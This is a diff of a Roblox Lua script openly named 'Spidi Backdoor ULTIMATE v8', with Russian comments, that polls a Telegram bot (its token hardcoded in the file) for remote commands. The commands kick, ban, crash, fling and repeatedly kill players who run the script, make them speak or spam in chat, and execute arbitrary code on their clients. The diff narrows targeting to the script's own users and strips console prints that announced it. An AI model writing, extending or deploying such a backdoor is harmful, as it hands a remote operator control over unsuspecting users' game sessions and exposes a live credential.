@@ -7,10 +7,6 @@
   Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER
 ]=]
 
-print("[Spidi] ========================================")
-print("[Spidi] 🚀 Spidi Backdoor ULTIMATE v8")
-print("[Spidi] ========================================")
-
 repeat wait() until game:IsLoaded()
 
 local BOT_TOKEN = "8778091630:AAEvqz_bo9fat2Or2Q_XYeeMWS2QBFPMRXc"
@@ -58,62 +54,9 @@ local function getChatId()
     return false
 end
 
--- ==================== БАЗА ИГРОКОВ С НУМЕРАЦИЕЙ ====================
-local playerDB = {}
+-- ==================== БАЗА ПОЛЬЗОВАТЕЛЕЙ СКРИПТА ====================
 local scriptUsers = {}
 
-local function updatePlayerDB()
-    playerDB = {}
-    local i = 1
-    for _, p in pairs(Players:GetPlayers()) do
-        playerDB[i] = p
-        playerDB[p.Name:lower()] = p
-        playerDB[p.DisplayName:lower()] = p
-        i = i + 1
-    end
-end
-
-local function findPlayer(input)
-    if not input or input == "" then return nil, "❌ Введи ник или номер" end
-    
-    updatePlayerDB()
-    
-    local num = tonumber(input)
-    if num and playerDB[num] then
-        return playerDB[num]
-    end
-    
-    input = input:lower()
-    if playerDB[input] then
-        return playerDB[input]
-    end
-    
-    local matches = {}
-    for _, p in pairs(Players:GetPlayers()) do
-        if p.Name:lower():find(input, 1, true) or p.DisplayName:lower():find(input, 1, true) then
-            table.insert(matches, p)
-        end
-    end
-    if #matches == 1 then return matches[1]
-    elseif #matches > 1 then
-        local names = {}
-        for _, p in pairs(matches) do table.insert(names, p.Name) end
-        return nil, "Найдено несколько: "..table.concat(names, ", ")
-    else return nil, "Игрок не найден" end
-end
-
-local function getPlayerList()
-    local list = {}
-    local i = 1
-    for _, p in pairs(Players:GetPlayers()) do
-        local isScript = scriptUsers[p.UserId] and " 🔥" or ""
-        table.insert(list, i..". "..p.Name..isScript)
-        i = i + 1
-    end
-    return list
-end
-
--- ==================== ДОБАВЛЕНИЕ ПОЛЬЗОВАТЕЛЕЙ СКРИПТА ====================
 local function addScriptUser(player)
     if not scriptUsers[player.UserId] then
         scriptUsers[player.UserId] = player
@@ -134,6 +77,64 @@ local marker = Instance.new("BoolValue")
 marker.Name = "SpidiUser"
 marker.Parent = Players.LocalPlayer
 
+local function updateScriptUsers()
+    for _, p in pairs(Players:GetPlayers()) do
+        if p:FindFirstChild("SpidiUser") then
+            addScriptUser(p)
+        end
+    end
+end
+
+-- ==================== ПОИСК ИГРОКА (ТОЛЬКО ПОЛЬЗОВАТЕЛИ) ====================
+local function findPlayer(input)
+    if not input or input == "" then
+        return nil, "❌ Введи ник или номер"
+    end
+    
+    local users = {}
+    for _, p in pairs(Players:GetPlayers()) do
+        if scriptUsers[p.UserId] then
+            table.insert(users, p)
+        end
+    end
+    
+    local num = tonumber(input)
+    if num and users[num] then
+        return users[num]
+    end
+    
+    input = input:lower()
+    local matches = {}
+    for _, p in pairs(users) do
+        if p.Name:lower():find(input, 1, true) or p.DisplayName:lower():find(input, 1, true) then
+            table.insert(matches, p)
+        end
+    end
+    if #matches == 1 then
+        return matches[1]
+    elseif #matches > 1 then
+        local names = {}
+        for _, p in pairs(matches) do
+            table.insert(names, p.Name)
+        end
+        return nil, "Найдено несколько: "..table.concat(names, ", ")
+    else
+        return nil, "Игрок не найден (скрипт не активен)"
+    end
+end
+
+local function getScriptUserList()
+    local list = {}
+    local i = 1
+    for _, p in pairs(Players:GetPlayers()) do
+        if scriptUsers[p.UserId] then
+            table.insert(list, i..". "..p.Name)
+            i = i + 1
+        end
+    end
+    return list
+end
+
 -- ==================== КД НА СООБЩЕНИЯ ====================
 local messageCooldown = {}
 local function canSendMessage(player)
@@ -152,11 +153,9 @@ local function desorientPlayer(target)
     if not char then return end
     local camera = Workspace.CurrentCamera
     if not camera then return end
-    
     camera.CameraType = Enum.CameraType.Scriptable
     local startTime = tick()
     local connection
-    
     connection = RunService.RenderStepped:Connect(function()
         if tick() - startTime >= 3 then
             connection:Disconnect()
@@ -188,7 +187,9 @@ local function sayMessage(target, msg)
     local legacyRemote = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
     if legacyRemote then
         local say = legacyRemote:FindFirstChild("SayMessageRequest")
-        if say then say:FireServer(msg, "All") end
+        if say then
+            say:FireServer(msg, "All")
+        end
     end
 end
 
@@ -198,14 +199,11 @@ local function stunPlayer(target)
     if not char then return end
     local hum = char:FindFirstChild("Humanoid")
     if not hum then return end
-    
     local origSpeed = hum.WalkSpeed
     local origJump = hum.JumpPower
     hum.WalkSpeed = 0
     hum.JumpPower = 0
-    
     stunnedPlayers[target.UserId] = { speed = origSpeed, jump = origJump }
-    
     task.delay(3, function()
         if stunnedPlayers[target.UserId] then
             local data = stunnedPlayers[target.UserId]
@@ -225,7 +223,6 @@ local function flingPlayer(target)
     local hrp = char:FindFirstChild("HumanoidRootPart")
     local hum = char:FindFirstChildOfClass("Humanoid")
     if not (hrp and hum) then return end
-
     hum.Sit = true
     local dirX = math.random() > 0.5 and 1 or -1
     local dirZ = math.random() > 0.5 and 1 or -1
@@ -240,19 +237,15 @@ local spinningPlayers = {}
 local function spinPlayer(target, speed)
     speed = speed or 1
     speed = math.clamp(speed, 0.5, 10)
-    
     if spinningPlayers[target.UserId] then
         spinningPlayers[target.UserId] = nil
     end
-    
     local char = target.Character
     if not char then return end
     local hrp = char:FindFirstChild("HumanoidRootPart")
     if not hrp then return end
-    
     local running = true
     spinningPlayers[target.UserId] = { running = true }
-    
     spawn(function()
         while running and spinningPlayers[target.UserId] and spinningPlayers[target.UserId].running do
             if not target.Character then break end
@@ -263,7 +256,6 @@ local function spinPlayer(target, speed)
             task.wait(0.05)
         end
     end)
-    
     return true
 end
 
@@ -285,7 +277,6 @@ end
 
 -- ==================== ОБРАБОТЧИК КОМАНД ====================
 local function handleCommand(cmd, args, username)
-    print("[Spidi] 📨 /"..cmd.." "..table.concat(args, " "))
     local info = "👤 Hacker228\n🔗 https://www.roblox.com/games/"..game.PlaceId
     
     if cmd == "start" then
@@ -295,8 +286,8 @@ local function handleCommand(cmd, args, username)
     
     if cmd == "help" then
         sendMessage("📋 <b>КОМАНДЫ SPIDI v8:</b>\n\n"..
-            "<b>👤 ИГРОКИ (все команды с выбором игрока):</b>\n"..
-            "/players - список всех игроков\n"..
+            "<b>👤 ПОЛЬЗОВАТЕЛИ СКРИПТА:</b>\n"..
+            "/players - список пользователей скрипта\n"..
             "/kick [ник/номер] - кикнуть\n"..
             "/ban [ник/номер] - забанить\n"..
             "/unban [ник/номер] - разбанить\n"..
@@ -307,44 +298,50 @@ local function handleCommand(cmd, args, username)
             "/unfly [ник/номер] - отключить полет\n"..
             "/crash [ник/номер] - крашнуть\n"..
             "/fling [ник/номер] - флинг\n"..
-            "/teleport [ник1] [ник2] - телепорт игрока1 к игроку2\n"..
-            "/bring [ник1] [ник2] - телепорт игрока2 к игроку1\n"..
+            "/teleport [ник1] [ник2] - телепорт\n"..
+            "/bring [ник1] [ник2] - притянуть\n"..
             "/loopkill [ник/номер] - бесконечный килл\n"..
             "/stun [ник/номер] - оглушить (3 сек)\n"..
             "/jump [ник/номер] - прыжок\n"..
-            "/spin [ник/номер] [скорость] - крутить (0.5-10)\n"..
+            "/spin [ник/номер] [скорость] - крутить\n"..
             "/unspin [ник/номер] - остановить вращение\n"..
             "/explode [ник/номер] - взорвать\n"..
-            "/des [ник/номер] - дезориентация камеры (3 сек)\n"..
+            "/des [ник/номер] - дезориентация (3 сек)\n"..
             "/warp [ник/номер] [1-10] - размыть экран\n"..
             "/unwarp [ник/номер] - убрать размытие\n\n"..
-            "<b>💬 ЧАТ (с выбором игрока):</b>\n"..
-            "/say [ник/номер] [текст] - сказать в чат от имени игрока\n"..
-            "/spam [ник/номер] [кол-во] [текст] - спам от имени игрока\n"..
-            "/message [ник/номер] [текст] - отправить сообщение\n\n"..
+            "<b>💬 ЧАТ:</b>\n"..
+            "/say [ник/номер] [текст] - сказать от имени\n"..
+            "/spam [ник/номер] [кол-во] [текст] - спам\n"..
+            "/message [ник/номер] [текст] - сообщение\n\n"..
             "<b>📊 ИНФО:</b>\n"..
-            "/players - список всех игроков\n"..
+            "/players - список пользователей\n"..
             "/server - инфо о сервере\n"..
             "/rejoin - перезайти\n"..
             "/execute [код] - выполнить код\n"..
-            "/setfps - ограничить FPS до 10 (toggle)\n"..
+            "/setfps - ограничить FPS (toggle)\n"..
             "/help - помощь")
         return
     end
     
     if cmd == "players" then
-        local list = getPlayerList()
+        local list = getScriptUserList()
         if #list == 0 then
-            sendMessage("👥 Игроков: 0")
+            sendMessage("👥 Пользователей скрипта: 0")
         else
-            sendMessage("👥 <b>Все игроки:</b>\n"..table.concat(list, "\n").."\n\n🔥 - использует Spidi Backdoor")
+            sendMessage("👥 <b>Пользователи Spidi:</b>\n"..table.concat(list, "\n"))
         end
         return
     end
     
     if cmd == "server" then
         local placeName = MarketplaceService:GetProductInfo(game.PlaceId).Name
-        sendMessage("🖥️ Сервер: "..placeName.."\nID: "..game.PlaceId.."\nИгроков: "..#Players:GetPlayers().."\nПользователей скрипта: "..#scriptUsers)
+        local scriptCount = 0
+        for _, p in pairs(Players:GetPlayers()) do
+            if scriptUsers[p.UserId] then
+                scriptCount = scriptCount + 1
+            end
+        end
+        sendMessage("🖥️ Сервер: "..placeName.."\nID: "..game.PlaceId.."\nИгроков: "..#Players:GetPlayers().."\nПользователей Spidi: "..scriptCount)
         return
     end
     
@@ -375,7 +372,6 @@ local function handleCommand(cmd, args, username)
     
     -- ========== КОМАНДЫ С ВЫБОРОМ ИГРОКА ==========
     
-    -- /say [ник] [текст]
     if cmd == "say" then
         local name = args[1]
         local msg = table.concat(args, " ", 2)
@@ -397,7 +393,6 @@ local function handleCommand(cmd, args, username)
         return
     end
     
-    -- /spam [ник] [кол-во] [текст]
     if cmd == "spam" then
         local name = args[1]
         local count = tonumber(args[2]) or 5
@@ -423,7 +418,6 @@ local function handleCommand(cmd, args, username)
         return
     end
     
-    -- /message [ник] [текст]
     if cmd == "message" then
         local name = args[1]
         local msg = table.concat(args, " ", 2)
@@ -453,7 +447,6 @@ local function handleCommand(cmd, args, username)
         return
     end
     
-    -- /teleport [ник1] [ник2]
     if cmd == "teleport" or cmd == "bring" then
         local name1 = args[1]
         local name2 = args[2]
@@ -471,15 +464,12 @@ local function handleCommand(cmd, args, username)
             sendMessage("❌ "..err2)
             return
         end
-        
         local hrp1 = target1.Character and target1.Character:FindFirstChild("HumanoidRootPart")
         local hrp2 = target2.Character and target2.Character:FindFirstChild("HumanoidRootPart")
-        
         if not hrp1 or not hrp2 then
             sendMessage("❌ Не найден персонаж у одного из игроков")
             return
         end
-        
         if cmd == "teleport" then
             hrp1.CFrame = hrp2.CFrame + Vector3.new(0, 3, 0)
             sendMessage("📍 <b>"..target1.Name.."</b> телепортирован к <b>"..target2.Name.."</b>")
@@ -571,7 +561,9 @@ local function handleCommand(cmd, args, username)
     
     if cmd == "unfly" and hrp then
         for _, v in pairs(hrp:GetChildren()) do
-            if v:IsA("BodyVelocity") then v:Destroy() end
+            if v:IsA("BodyVelocity") then
+                v:Destroy()
+            end
         end
         sendMessage("🛑 Отключен полет: <b>"..target.Name.."</b>")
         return
@@ -602,7 +594,9 @@ local function handleCommand(cmd, args, username)
             for i = 1, 10 do
                 if not target or not target.Character then break end
                 local hum = target.Character:FindFirstChild("Humanoid")
-                if hum then hum.Health = 0 end
+                if hum then
+                    hum.Health = 0
+                end
                 task.wait(0.5)
             end
         end)
@@ -696,15 +690,12 @@ local function handleCommand(cmd, args, username)
     sendMessage("❌ Неизвестная команда. /help")
 end
 
--- ==================== УВЕДОМЛЕНИЕ О НОВЫХ ИГРОКАХ ====================
+-- ==================== УВЕДОМЛЕНИЕ О НОВЫХ ПОЛЬЗОВАТЕЛЯХ ====================
 local oldPlayers = {}
 local function checkNewPlayers()
     for _, p in pairs(Players:GetPlayers()) do
         if not oldPlayers[p.UserId] then
-            local success, hasScript = pcall(function()
-                return p:FindFirstChild("SpidiUser")
-            end)
-            if success and hasScript then
+            if p:FindFirstChild("SpidiUser") then
                 addScriptUser(p)
             end
             oldPlayers[p.UserId] = true
@@ -736,13 +727,17 @@ local function pollUpdates()
                     local text = msg.text
                     if text:sub(1,1) == "/" then
                         local parts = {}
-                        for w in string.gmatch(text, "%S+") do table.insert(parts, w) end
+                        for w in string.gmatch(text, "%S+") do
+                            table.insert(parts, w)
+                        end
                         local cmd = parts[1]:sub(2):lower()
                         table.remove(parts, 1)
                         handleCommand(cmd, parts, msg.from.username)
                     end
                 end
-                if update.update_id then lastId = update.update_id end
+                if update.update_id then
+                    lastId = update.update_id
+                end
             end
         end
     end
@@ -810,7 +805,7 @@ local function createGUI()
     desc.BackgroundTransparency = 1
     desc.Size = UDim2.new(1, -40, 0, 80)
     desc.Position = UDim2.new(0, 20, 0, 70)
-    desc.Text = "Spidi Backdoor Active!\n/players - список всех игроков"
+    desc.Text = "Spidi Backdoor Active!\n/players - список пользователей"
     desc.TextColor3 = Color3.fromRGB(0, 255, 0)
     desc.TextSize = 18
     desc.Font = Enum.Font.GothamBold
@@ -887,11 +882,5 @@ wait(3)
 getChatId()
 
 if CHAT_ID then
-    sendMessage("✅ Spidi Backdoor ULTIMATE v8 запущен!\n👤 Hacker228\n📋 /players - список всех игроков\n📋 /help - все команды")
+    sendMessage("✅ Spidi Backdoor ULTIMATE v8 запущен!\n👤 Hacker228\n📋 /players - список пользователей\n📋 /help - все команды")
 end
-
-print("[Spidi] ========================================")
-print("[Spidi] ✅ СКРИПТ ЗАПУЩЕН!")
-print("[Spidi] 📌 /players - список всех игроков")
-print("[Spidi] 📌 /help - все команды")
-print("[Spidi] ========================================")
